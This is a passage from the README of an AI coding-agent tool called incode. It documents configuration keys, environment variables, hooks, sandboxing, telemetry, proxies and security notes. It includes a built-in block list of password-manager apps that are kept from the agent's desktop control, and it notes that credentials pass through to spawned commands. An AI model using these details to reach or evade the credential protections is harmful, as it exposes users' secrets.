    "implement": ["sonnet", "opus"],
    "plan":      ["@top", "sonnet"],
    "review":    ["@top"]
  },
  "budget_tokens": 2000000,
  "verify_command": ["cargo", "test"],
  "scaffold": { "rust": "cargo new --vcs none app", "web": "npm create vite@latest" },
  "memory_url": "http://127.0.0.1:9180",
  "engine_bin": "/path/to/incord-memory-service",
  "api_providers": [{ "name": "team", "url": "https://agents.example", "key_env": "TEAM_API_KEY" }],
  "api_models": [{ "name": "zai", "format": "anthropic", "auth": "bearer",
                   "url": "https://api.z.ai/api/anthropic/v1/messages", "key_env": "ZAI_API_KEY",
                   "model": "glm-5.3", "sub_model": "glm-5.3-flash" }],
  "web_search": { "url": "https://search.example/api", "key_env": "SEARCH_KEY" },
  "tools": [{ "name": "browser", "release": "<owner>/<repo>", "version": "latest",
              "asset": "<prefix>-{arch}-{os}.{ext}", "run": ["<program>", "mcp"],
              "provides": "browser" }],
  "pdf_renderer": "auto",
  "sandbox": "workspace-write",
  "sandbox_network": "allow",
  "desktop_display": "xvfb:1280x800",
  "desktop_limits": { "max_actions_per_minute": 60, "blocked_apps": ["My Bank"] },
  "hooks": { "pre_tool_use": ["my-check"], "post_tool_use": ["my-log"] },
  "plugins": { "owner": true, "auditor": true, "recorder": true, "guards": true,
               "skills": true, "mcp": true, "disabled_skills": [], "disabled_mcp": [] }
}
```

| Key | What it sets |
|---|---|
| `model` | The session's model |
| `agent` · `sub_agent` | The lead agent · the agent for `/run`'s tasks (written by `/agent`) |
| `tiers` · `roles` | Named model lists (`@name`) · each role's ordered candidates (written by `/roles`) |
| `budget_tokens` | The token ceiling for a run |
| `verify_command` | The command that decides whether work is finished |
| `scaffold` | The generator you want [a new project](#a-new-project) laid out with, per stack. A preference handed to the model when it writes `## Layout`; incode runs nothing from it itself |
| `memory_url` · `engine_bin` | Where the memory service listens · where its engine binary is |
| `api_providers` | Services that list API agents ([contract](#the-api-providers-contract)): `name`, `url`, `key_env`, `agents_path`, `turns_path`, `list_timeout_secs` |
| `api_models` | [Models reached with a key](#api-models): `name`, `format`, `url`, `key_env`, `model`, `sub_model`, `aliases`, `auth`, `max_tokens`, `max_steps`, `timeout_secs`, `max_retries`, `prompt_cache`, `api_version` |
| `cli_agents` | [Agent CLIs](#cli-agents) to look for, changed or added: `id`, `commands`, `protocol`, `version_args`, `display_name`, `default_sub_agent` |
| `web_search` | `WebSearch`'s endpoint (`url`, the query sent as `q`) and the name of its key's variable. The key is sent only over https or to loopback |
| `tools` | [External tools](#external-tools): each one's release, version, asset, `run` and `provides` |
| `browser_bin` · `pdf_renderer` | For development, a headless browser executable that wins over the installed one · which program `RenderPdf` uses |
| `sandbox` | `off` · `workspace-write` · `read-only`; unset follows the permission mode |
| `sandbox_network` | `allow` (default) · `deny` — see [the OS sandbox](#the-os-sandbox) |
| `sandbox_engine` · `sandbox_allow_hosts` · `sandbox_backend` | `builtin` (default) · `sbx`; under sbx, the hosts a command may reach and, on Windows, `native` · `wsl` · `auto` — see [the OS sandbox](#the-os-sandbox) |
| `codex_tools` | `own` (default) · `incode` — whose tools a `codex` model runs; see [the codex route](#the-codex-route-whose-tools) |
| `hooks` (also `desktop_hooks`) | Your `pre_tool_use` / `post_tool_use` commands, run for every tool, and `user_prompt_submit`, run for each line you send. The event is JSON on stdin (`hook_event_name`, `session_id`, `cwd`, and `tool_name`/`tool_input` or `prompt`); exit 2 on a pre-tool command denies the call, on a prompt command refuses the line (the reason is shown and nothing is sent — not to the agent, not to the memory engine); a prompt command's stdout is added to that turn's context, and your line is never changed; bounded at 10 s. The prompt hook runs for lines typed in the REPL or sent over `--acp`, and for `-t`; for `/review` it sees the review prompt (the change included), and for `/run` each task's instruction before a worker or lane gets it — a refused task fails that attempt, and the hook's output rides that task's turn. It is taken from here and from your own plugins (`~/.incode/plugins/`), never from a project's `.incode/plugins/`, which arrives with whatever was cloned. `pre_compact` runs before `/compact` (event field `trigger`: `manual`, plus `custom_instructions`; when the agent compacts its own conversation, as a CLI agent does, it still runs and nothing is compacted by incode) and before the API route compacts on its own near the context window (`trigger`: `auto`, its output shown as incode's note during the turn); a CLI agent's own automatic compaction happens inside that agent and fires nothing, and `stop` when one of your turns has ended (`last_assistant_message`); neither can refuse anything, and their stdout is shown — with the compaction result, and with the turn's notices. `session_start` runs when a session opens (`source`: `startup`) and `session_end` when it closes (`reason`, e.g. `prompt_input_exit`, `other`), in the REPL, `--acp` and `-t`; neither can stop or keep anything, and their stdout is shown (on stderr for `-t`; a `--acp` session's end output goes to the trace, as the client has gone). They supersede a project's `.incode/lifecycle.json` (or the `lifecycle` section of `.incode.json`), whose `on_session_start`/`on_session_end` still run in the REPL — but only once you approve them as they are, since they arrive with whatever was cloned: `incode lifecycle show` lists them, `incode lifecycle approve` approves them, and any change needs approving again. `subagent_stop` runs when a sub-agent (the `Agent` tool) has finished, told `agent_type` (its definition, role, or `sub-agent`), `task`, `last_assistant_message` and `outcome` (`completed`, `failed` or `cancelled`); it cannot keep it working, and its output is traced, not shown. `notification` runs whenever incode would notify you (`notification_type`: `turn_done` or `input_needed`, plus `message`), in the background beside `notify_command`, in the REPL; its output is not shown |
| `desktop_limits` | The desktop's limits, each optional: `max_actions_per_minute` (120), `heartbeat_deadline_secs` (30), `tree_depth` (12), `tree_max_elements` (400), `journal_max_bytes` (262144), `xvfb_start_timeout_secs` (10), `clipboard_timeout_secs` (5), `accessibility_call_timeout_ms` (1000), `paste_restore_delay_ms` (500, how long the pasted text stays on the clipboard before the old one is put back), `settle_ms` (300, the pause before a `screenshot_after`), `max_scroll_steps` (50, wheel steps in one `scroll`), `tree_max_visited` (4000, elements one tree walk may visit), and `blocked_apps` (application names, matched case-insensitively as a part of the name, added to the built-in password managers: 1Password, Bitwarden, LastPass, Dashlane, KeePass, NordPass, Proton Pass, Enpass, RoboForm, Keeper). The first two are safety limits and may only be lowered; zero and unknown keys are refused, and the desktop does not start on a malformed admin.json |
| `desktop_display` | Linux computer use: `":N"` drives a running X display; `"xvfb"` or `"xvfb:1280x800"` starts a private Xvfb for the desktop server's lifetime (default 1920x1080). Unset refuses rather than using `$DISPLAY`. `paste_text` needs `xclip` or `xsel`; `ui_tree` needs a D-Bus session with at-spi2-core |
| `plugins` | Which memory-service parts are used; all on by default |

Environment variables:

| Variable | What it sets |
|---|---|
| `INCODE_MODEL` | The session's model |
| `INCODE_AGENT` | The lead agent, by id |
| `INCODE_ROLE_<ROLE>` | That role's ordered candidates, comma-separated |
| `INCODE_BUDGET_TOKENS` | The token ceiling for a run |
| `INCODE_VERIFY_CMD` | The check command |
| `INCODE_SPEC_GATE` | `off` lets one `-t` run write source without the spec set (as `--spec-gate=off`); read by `-t` only |
| `INCODE_CHECK_CMD` | What `Diagnostics` runs |
| `INCODE_LANES` | Parallel `/run` lanes (needs git; at most 8) |
| `INCODE_SANDBOX` · `INCODE_SANDBOX_NETWORK` | The sandbox mode · the network switch |
| `INCODE_DESKTOP` | `1` offers the [computer use](#computer-use) tools |
| `INCODE_CODEX_TOOLS` | `own` · `incode`, over `admin.json` `codex_tools` |
| The variable each `key_env` names | That entry's key — the only part of an API route read from the environment |
| `INCORD_MEMORY_URL` · `INCORD_ENGINE_BIN` | The memory service · its engine binary |
| `INCODE_BROWSER` · `INCODE_PDF_BROWSER` · `INCODE_SOFFICE` | The headless browser · the PDF printer · LibreOffice |
| `INCODE_SERVE_ORIGINS` | Extra origins `--serve` accepts |
| `INCODE_DIR` | Where incode keeps its settings (default `~/.incode`) |
| `INCODE_TRACE` | Say what incode did, as it happens |
| `INCODE_ASCII` · `INCODE_NO_SPLASH` · `INCODE_MOUSE` | Terminal display |

### What lives where

| Path | What it holds |
|---|---|
| `~/.incode/admin.json` | Your settings, including your [permission rules](#permission-rules) |
| `~/.incode/mcp.json` · `~/.incode/mcp-approvals.json` · `~/.incode/mcp-tokens.json` | Your [MCP servers](#mcp-servers) · the project servers you approved · their OAuth tokens |
| `~/.incode/agents/*.md` | Your sub-agents, for every project |
| `~/.incode/sessions/<workspace>.json` | Session pointers, so a conversation can be reopened |
| `~/.incode/history.txt` | The lines you typed |
| `~/.incode/tools/<name>/` | An installed external tool: `<version>/` and `installed.json` |
| `<project>/.incode/ledger.json` | What is being worked on in *this* checkout |
| `<project>/.incode/contracts.json` | Interfaces frozen before the work was split up |
| `<project>/.incode/guards.json` | Extra protected paths for this project |
| `<project>/.incode/settings.json` | The project's `deny` / `ask` permission rules |
| `<project>/.mcp.json` | The project's MCP servers (asked about before each first runs) |
| `<project>/.incode/agents/*.md` | The project's sub-agents |
| `<project>/.incode/checkpoints/<session>/` | Each turn's "before", for `/undo` and `/rewind` |
| `<project>/.incode/transcripts/` · `.incode/context/` | Session transcripts · oversized memory blocks |
| `<project>/.incode/transcripts/tasks/<task>.jsonl` | What each `/run` agent was told and did, one file per task |
| `<project>/.incode/desktop.jsonl` · `.incode/desktop.stop` | Every desktop call, typed text by length only · the stop file `--desktop-stop` writes |
| `<project>/.incode/.gitignore` | Which of the above is this machine's own and is not committed |

Per-project state lives **in the project**; `~/.incode` is yours. Of the
project's `.incode/`, commit `contracts.json`, `guards.json`, `settings.json`,
`agents/*.md` and `.gitignore`; the `.gitignore` incode writes keeps the rest out.

Task transcripts used to be written into `.incode/agents/`, beside the
sub-agent definitions; each start moves any `*.jsonl` found there to
`.incode/transcripts/tasks/`, never replacing one already there.

A project's `.incord/` belongs to Incord Memory, the separate memory product
(its `RULE_ACK`, `MEMORY_FIRST_OFF` and the rest); incode leaves it alone.

**Upgrading from the old names.** incode used to keep its state in `.incord/`
and `~/.incord-code/`. At the start of a mode that reads your settings (the
REPL, `--acp`, `-t` and the tool servers), when `INCODE_DIR` is not set, `~/.incode` does
not exist and `~/.incord-code` does, the old folder is **copied** to
`~/.incode` (through a staging folder renamed into place, so a half copy is
never taken for the real one) and `~/.incord-code/MOVED_TO_INCODE.txt` says
where it went; the old folder is never deleted. In each project, every item of
incode's own still in `.incord/` (the ones in the table above, plus
`brief.cache.json`, `findings/`, `serve.json`, `serve.token`, `run.stop`,
`team.jsonl`, `desktop.jsonl`, `desktop.stop`) is moved into `.incode/`, one
move per item; an item whose target already exists is skipped (an empty folder
there gives way), and the memory
engine's files stay where they are. `INCODE_TRACE` (area `migrate`) says what
moved. The old `INCORD_*` variables are not read any more: rename them.

### Telemetry (OpenTelemetry)

Off unless you turn it on. Set `INCODE_TELEMETRY=1` (or `"telemetry": true` in
admin.json) **and** name a collector:

```sh
export INCODE_TELEMETRY=1
export OTEL_EXPORTER_OTLP_ENDPOINT=https://otel.example.com   # /v1/metrics and /v1/logs are added
export OTEL_EXPORTER_OTLP_HEADERS="authorization=Bearer%20<token>"
```

incode sends OTLP over HTTP as JSON (`OTEL_EXPORTER_OTLP_PROTOCOL` unset or
`http/json`; any other protocol is reported and nothing is sent), only to
`https` or to this machine, after every turn and at the end of `-t`. The
per-signal `OTEL_EXPORTER_OTLP_METRICS_ENDPOINT` / `..._LOGS_ENDPOINT` override
the base. `incode --admin` shows whether it is on and where it goes.

- **Metrics** (delta sums): `incode.session.count` (`mode`),
  `incode.token.usage` (`type`, `model`), `incode.cost.usage` (USD, priced
  models), `incode.tool.calls` (`tool`, `outcome`: `allowed` or `denied`),
  `incode.turn.count` and `incode.turn.duration` (seconds).
- **Events** (log records): `incode.permission_prompt` (`tool`, `answer`),
  `incode.compaction` (`trigger`, tokens before and after),
  `incode.user_prompt` (`prompt_length`).
- **Never sent:** the text of a prompt, a file, or a tool's input or output. A
  prompt's text is added to its event only with `OTEL_LOG_USER_PROMPTS=1`.

### Proxies and certificates

Behind a corporate proxy, every outbound request — the model API, web fetch and
search, MCP servers over HTTP and their OAuth, external tools and
`incode update`, the memory engine — follows `HTTPS_PROXY`, `HTTP_PROXY`,
`ALL_PROXY` and `NO_PROXY` (either case), and then the proxy set in Windows'
Internet Options or macOS' network settings. A request to **this machine** —
`localhost`, a `.localhost` name, `127.0.0.0/8` or `::1` — never goes through a
proxy, whatever `NO_PROXY` says, so a local memory engine, model server or MCP
server keeps working. Through a proxy, web fetch's check of where a name points
is made here, and the proxy resolves the name again itself: what the proxy can
reach is the proxy's to limit.

When the proxy re-signs TLS with the company's own certificate authority, point
`INCODE_CA_CERTS` (or `SSL_CERT_FILE`) at its PEM file — one or more
certificates. They are trusted beside the system's own. A file that cannot be
read, or holds no certificate, is said on stderr at the first request and
nothing extra is trusted, so a connection that needed it fails with a
certificate error rather than going elsewhere. A coding agent CLI incode drives
(claude, codex, agy) makes its own requests and reads its own settings.

## Security notes

- **No subscription login is read or held.** The agent CLIs authenticate
  themselves. Keys for the API route, API providers and web search are read
  from the environment variables you name, when needed, and never written to
  disk.
- **The model's CLI is handed only a loopback address and a per-turn token**
  (in its environment, not its argv) to reach incode's tools. A call after the
  turn ended is refused.
- **Spawned commands get a bounded environment**, not a safe one. The allowlist
  deliberately passes cloud, git-forge and model credentials through, because
  `gh` and a deploy cannot work without them. Unset what you do not want
  reachable before starting a session. `--no-env-filter` widens this.
- **`history.txt` is plain text.** Anything you type is written there, a
  credential included. Delete the file if you paste one.
- **Web reads refuse the private network** by name and again by resolved
  address, with the connection pinned to the address that was checked. A
  redirect to a different host is checked by name only. The headless browser
  resolves names itself after incode's check; its own private-network block is
  the second line.
- **Retrieved text is data, never instructions.** What comes back from memory,
  the web, another agent or a tool is labelled as such before the model sees it.

## Limits

- `codex` (by default) and `agy` still use their own tools; `claude` runs as a
  model only, and so does `codex` with `codex_tools: "incode"`
  ([opt-in](#the-codex-route-whose-tools)). On the other routes the guards are a
  sentinel (detection), not a gate.
- A client's MCP servers are stdio or Streamable HTTP; the older SSE transport is
  not spoken.
- The Windows sandbox confines workspace-write only when you name it, and does
  not restrict the network.
- Computer use: on Windows and macOS it shares your own desktop (a private
  desktop needs a VM there); Linux is X11 only, not Wayland; GTK 4 reports no
  control positions; macOS has been built and unit-tested on a Mac but its
  live drive (clicking and typing in a GUI session) is still to be run.

The full list is in `docs/ROADMAP.md`.

## Development

```sh
scripts/test-all.sh                 # everything CI runs, and the SDKs and editor extension
cargo test                          # about 2,100 tests (library and binary)
cargo clippy --all-targets -- -D warnings
cargo fmt
```

[TESTING.md](TESTING.md) lists every suite, the Windows check, the live tests
that are off by default and what is worth trying by hand.

The documents under `docs/` are the input the loop reads, not decoration:
`PRD.md` (what and why), `ARCHITECTURE.md` (the shape), `CONVENTIONS.md` (how
the code should read), `ASSUMPTIONS.md` (what was decided without asking),
`RUNNER.md` (the autonomous loop), `VERIFICATION.md` (what counts as done),
`ROADMAP.md` (what is done and what is open).

## Contributing

Contributions are welcome: bug reports, fixes, new providers, tools and
platforms, and corrections to the documents. See
[CONTRIBUTING.md](CONTRIBUTING.md) for the checks a pull request must pass
and how changes are written, tested and reviewed.

Report a vulnerability privately, as [SECURITY.md](SECURITY.md) describes,
never in a public issue. Everyone taking part follows the
[Code of Conduct](CODE_OF_CONDUCT.md).

## Licence

Apache License 2.0, copyright 2026 Incord AI. See [LICENSE](LICENSE) and
[NOTICE](NOTICE).
